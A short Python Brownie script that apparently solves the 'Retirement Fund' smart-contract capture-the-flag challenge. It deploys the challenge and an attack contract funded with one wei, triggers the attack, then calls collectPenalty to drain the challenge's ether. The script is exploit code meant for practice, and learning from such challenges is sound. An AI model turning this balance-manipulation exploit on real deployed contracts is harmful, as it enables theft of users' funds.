import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    RetirementFundChallenge,
    RetirementFundAttack,
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account("player")
    non_player = get_account("non_player")
    challenge_contract = get_challenge_contract(
        RetirementFundChallenge, 'retirement_fund', [player], {"from": non_player, "value": Web3.toWei(1, "ether")}
    )
    
    attack_contract = RetirementFundAttack.deploy(challenge_contract, {"from": player, "value": Web3.toWei(1, "wei")})
    tx = attack_contract.attack({"from": player})
    tx.wait(1)
    tx = challenge_contract.collectPenalty({"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)